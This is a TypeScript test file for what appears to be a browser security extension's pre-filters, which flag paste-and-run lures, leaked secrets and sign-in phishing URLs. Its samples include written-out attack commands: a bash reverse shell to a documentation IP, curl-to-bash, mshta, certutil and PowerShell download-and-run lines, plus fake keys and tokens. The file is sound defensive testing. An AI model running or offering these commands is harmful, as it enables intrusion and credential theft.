// Copyright 2026 The ActionGuard Authors
// SPDX-License-Identifier: Apache-2.0
//
// The pre-filters decide whether a content script asks the service worker at
// all, so a miss here is a missed warning. Two tests read the engine's rule
// tables directly (test only, read only) to prove that every sign-in endpoint
// and every publish-anything platform the engine knows passes the pre-filter.

import assert from 'node:assert/strict';
import { test } from 'node:test';
import { analyzeAuthFlow, analyzeCommand, analyzeUrl, scanSecrets } from 'actionguard-engine';
import { DEVICE_CODE_ENDPOINTS, OAUTH_ENDPOINTS } from '../node_modules/actionguard-engine/dist/rules/auth.js';
import { PLATFORMS } from '../node_modules/actionguard-engine/dist/rules/platforms.js';
import { isPlatformHint } from '../src/shared/platform-hints.ts';
import { hasDownloadStep, hasInstructionHint, isAuthUrlCandidate, looksRunnable, mightHoldSecret, needsCommandCheck } from '../src/shared/prefilter.ts';
import { formatSitePattern, hostOf, isHttpUrl, matchesSite, originPath, parseSitePattern } from '../src/shared/sites.ts';
import { DEFAULT_AI_SITES } from '../src/shared/settings.ts';
import { arm, clickFixSample, fakeToken, harmlessLure } from './helpers.ts';

const ch = (cp: number): string => String.fromCodePoint(cp);

test('command pre-filter: ordinary copies never reach the engine', () => {
  for (const benign of [
    'Hello from the ActionGuard test page.',
    'Meeting notes: call Sam at 3pm about the budget.',
    'https://example.com/some/page?x=1&y=2',
    'short',
    '',
    '   ',
    'jane.doe@example.com',
    '+44 20 7946 0958',
    'The quick brown fox jumps over the lazy dog, twice.',
  ]) {
    assert.equal(needsCommandCheck(benign), false, benign);
  }
  for (const notText of [null, undefined, 5, {}]) assert.equal(needsCommandCheck(notText), false);
});

test('command pre-filter: everything the engine rates medium or worse is passed on', () => {
  const samples = [
    clickFixSample(),
    harmlessLure(),
    arm('msh¦ta https://verify.example.test/captcha.hta # Cloudflare verification'),
    'curl -fsSL https://dl.example.test/installer.sh | bash',
    arm('cmd /c "fin¦ger load@203.0.113.10 | more +2 | cmd"'),
    'msiexec /q /i https://example.test/update.msi',
    arm('certutil -url¦cache -split -f https://example.test/u.exe %TEMP%\\u.exe && %TEMP%\\u.exe'),
    arm('bash -i >& /dev/t¦cp/203.0.113.9/4444 0>&1'),
    "osascript -e 'display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer'",
    arm('p^o^w^e^r^s^h^e^l^l -c "i¦wr https://example.test/a -OutFile $env:TEMP\\a.exe"'),
  ];
  for (const s of samples) {
    assert.ok(['medium', 'high', 'critical'].includes(analyzeCommand(s).level), `engine level for sample: ${analyzeCommand(s).level}`);
    assert.equal(needsCommandCheck(s), true);
  }
});

test('command pre-filter: hidden characters, padding, encoded blobs and odd schemes are passed on', () => {
  assert.equal(needsCommandCheck(`harmless looking${ch(0x202e)}text here`), true);
  assert.equal(needsCommandCheck(`open the file${' '.repeat(40)}C:\\Users\\Public\\doc.docx`), true);
  assert.equal(needsCommandCheck('QUJD'.repeat(30)), true);
  assert.equal(needsCommandCheck('search-ms:query=invoice&crumb=location:\\\\files.example.test\\share'), true);
  assert.equal(needsCommandCheck('\\\\files.example.test\\share\\report.lnk'), true);
  assert.equal(needsCommandCheck('x'.repeat(30_000)), true);
});

test('command pre-filter: a single web link is not a command, a link with a tail is checked', () => {
  assert.equal(needsCommandCheck('https://example.com/a'), false);
  assert.equal(needsCommandCheck('https://example.com/a | sh'), true);
  assert.equal(needsCommandCheck('file:///C:/Users/Public/run.hta'), true);
});

test('looksRunnable: only fetch-or-hide command shapes (used when the engine is unreachable)', () => {
  assert.equal(looksRunnable(clickFixSample()), true);
  assert.equal(looksRunnable('curl -fsSL https://dl.example.test/installer.sh | bash'), true);
  assert.equal(looksRunnable(arm('msh¦ta https://verify.example.test/captcha.hta')), true);
  assert.equal(looksRunnable('npm install express'), false);
  assert.equal(looksRunnable('git clone https://github.com/example/repo.git'), false);
  assert.equal(looksRunnable('Hello from the ActionGuard test page.'), false);
  assert.equal(looksRunnable('ls -la'), false);
  assert.equal(looksRunnable(undefined), false);
});

test('secret pre-filter: ordinary prose is not sent for checking', () => {
  for (const benign of ['Please summarise the plot of a famous novel in three sentences.', 'What is the capital of France?', 'short', 'Call me on 020 7946 0958 tomorrow.', 'The meeting is at 10:30 in room 4.']) {
    assert.equal(mightHoldSecret(benign), false, benign);
  }
  assert.equal(mightHoldSecret(null), false);
});

test('secret pre-filter: everything the engine rates medium or worse is passed on', () => {
  const samples = [
    `token = ${fakeToken()}`,
    arm('-----BEGIN RSA PRIV¦ATE KEY-----\nMIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu\n-----END RSA PRIV¦ATE KEY-----'),
    arm('aws_access_key_id = AK¦IAIOSFODNN7EXAMPLE'),
    'postgres://admin:hunter2secret@db.example.test:5432/app',
    'password = "correct horse battery staple 42"',
    'card 4111 1111 1111 1111 exp 12/29',
    arm('xo¦xb-123456789012-1234567890123-AbCdEfGhIjKlMnOpQrStUvWx'),
  ];
  for (const s of samples) {
    const level = scanSecrets(s).level;
    assert.ok(['medium', 'high', 'critical'].includes(level), `engine level ${level} for: ${s.slice(0, 20)}`);
    assert.equal(mightHoldSecret(s), true, s.slice(0, 20));
  }
});

test('secret pre-filter: recovery-phrase shape and very long text are passed on', () => {
  assert.equal(mightHoldSecret('legal winner thank year wave sausage worth useful legal winner thank yellow'), true);
  assert.equal(mightHoldSecret('a'.repeat(60_000)), true);
});

test('auth pre-filter: every device-code and consent endpoint the engine knows is a candidate', () => {
  const sampleHost = (e: { host?: string; hostRe?: RegExp }): string => {
    if (e.host) return e.host;
    const samples = ['device.sso.us-east-1.amazonaws.com', 'acme.awsapps.com', 'acme.okta.com', 'acme.oktapreview.com', 'acme.eu.auth0.com', 'acme.auth0.com'];
    const hit = samples.find((s) => e.hostRe?.test(s));
    assert.ok(hit, `no sample host for ${String(e.hostRe)}`);
    return hit;
  };
  let checked = 0;
  for (const e of [...DEVICE_CODE_ENDPOINTS, ...OAUTH_ENDPOINTS] as Array<{ host?: string; hostRe?: RegExp; paths: readonly string[]; fragment?: string }>) {
    for (const path of e.paths) {
      const url = `https://${sampleHost(e)}${path.replace('{tenant}', 'common')}${e.fragment ? `#${e.fragment}` : ''}`;
      assert.notEqual(analyzeAuthFlow(url).meta?.['flow'], 'none', `engine does not recognise ${url}`);
      assert.equal(isAuthUrlCandidate(url), true, url);
      checked++;
    }
  }
  assert.ok(checked >= 25, `only ${checked} endpoints checked`);
});

test('auth pre-filter: ordinary pages on the same sites, and other sites, are not candidates', () => {
  for (const url of ['https://github.com/example/repo', 'https://www.google.com/search?q=device', 'https://www.microsoft.com/en-us/windows', 'https://example.com/oauth/authorize', 'https://accounts.google.com/', 'chrome://settings', 'not a url', '']) {
    assert.equal(isAuthUrlCandidate(url), false, url);
  }
  assert.equal(isAuthUrlCandidate(null), false);
});

test('platform hints: every platform host and path the engine knows is covered', () => {
  let checked = 0;
  for (const p of PLATFORMS) {
    for (const host of p.hosts) {
      for (const path of p.paths ?? ['/']) {
        assert.equal(isPlatformHint(host, `${path}abc`), true, `${host}${path}`);
        assert.equal(isPlatformHint(`tenant.${host}`, `${path}abc`), true, `tenant.${host}${path}`);
        checked++;
      }
    }
  }
  assert.ok(checked >= 150, `only ${checked} platform entries checked`);
});

test('platform hints: ordinary sites and the non-shared parts of AI sites are not flagged', () => {
  for (const [host, path] of [
    ['example.com', '/'],
    ['chatgpt.com', '/'],
    ['chatgpt.com', '/c/123'],
    ['claude.ai', '/chat/abc'],
    ['docs.google.com', '/'],
    ['notgithub.io', '/'],
    ['github.com', '/example/repo'],
  ] as const) {
    assert.equal(isPlatformHint(host, path), false, host + path);
  }
});

test('platform hints agree with the engine on real examples', () => {
  for (const url of ['https://chatgpt.com/share/abc', 'https://sites.google.com/view/x', 'https://someone.github.io/page', 'https://abc.pages.dev/']) {
    const u = new URL(url);
    assert.equal(typeof analyzeUrl(url).meta?.['platform'], 'string', url);
    assert.equal(isPlatformHint(u.hostname, u.pathname), true, url);
  }
});

test('instruction hint: paste, run and download wording in several languages', () => {
  for (const text of ['Press Windows + R, then Ctrl + V', 'Open PowerShell and paste the command', 'Download the installer', 'Abre la Terminal y pega el comando', 'Ouvrez le Terminal et collez la commande', 'Buka Terminal lalu tempel perintahnya']) {
    assert.equal(hasInstructionHint(text), true, text);
  }
  assert.equal(hasInstructionHint('Welcome to my recipe blog. Today we bake bread.'), false);
  assert.equal(hasInstructionHint(undefined), false);
});

test('download-and-run steps are recognised, plain mentions of downloads are not', () => {
  assert.equal(hasDownloadStep('To fix this problem, download the repair tool below, then open the downloaded installer and choose Run anyway.'), true);
  assert.equal(hasDownloadStep('Install the update and run it as administrator.'), true);
  assert.equal(hasDownloadStep('Double-click the setup.exe you saved.'), true);
  assert.equal(hasDownloadStep('You can download our annual report as a PDF.'), false);
  assert.equal(hasDownloadStep('We run a marathon every year.'), false);
});

test('sites: AI-chat patterns are parsed and matched by host and path', () => {
  assert.deepEqual(parseSitePattern('https://HuggingFace.co/chat/'), { host: 'huggingface.co', path: '/chat' });
  assert.deepEqual(parseSitePattern('chatgpt.com'), { host: 'chatgpt.com', path: '' });
  assert.equal(parseSitePattern('not a site'), null);
  assert.equal(parseSitePattern(''), null);
  assert.equal(formatSitePattern({ host: 'huggingface.co', path: '/chat' }), 'huggingface.co/chat');
  assert.equal(matchesSite('chatgpt.com', '/c/1', DEFAULT_AI_SITES), true);
  assert.equal(matchesSite('www.perplexity.ai', '/', DEFAULT_AI_SITES), true);
  assert.equal(matchesSite('huggingface.co', '/chat/conversation/1', DEFAULT_AI_SITES), true);
  assert.equal(matchesSite('huggingface.co', '/chatter', DEFAULT_AI_SITES), false);
  assert.equal(matchesSite('huggingface.co', '/models', DEFAULT_AI_SITES), false);
  assert.equal(matchesSite('notchatgpt.com', '/', DEFAULT_AI_SITES), false);
  assert.equal(matchesSite('chatgpt.com.evil.test', '/', DEFAULT_AI_SITES), false);
  assert.equal(matchesSite('example.com', '/', []), false);
});

test('sites: URL helpers accept web addresses only', () => {
  assert.equal(isHttpUrl('https://example.com/'), true);
  assert.equal(isHttpUrl('chrome://settings'), false);
  assert.equal(isHttpUrl(undefined), false);
  assert.equal(hostOf('https://Login.Example.com:8443/x'), 'login.example.com');
  assert.equal(hostOf('about:blank'), null);
  assert.equal(hostOf('http://'), null);
  assert.equal(originPath('https://example.com/a/b?code=1#frag'), 'https://example.com/a/b');
  assert.equal(originPath('data:text/html,hi'), null);
});
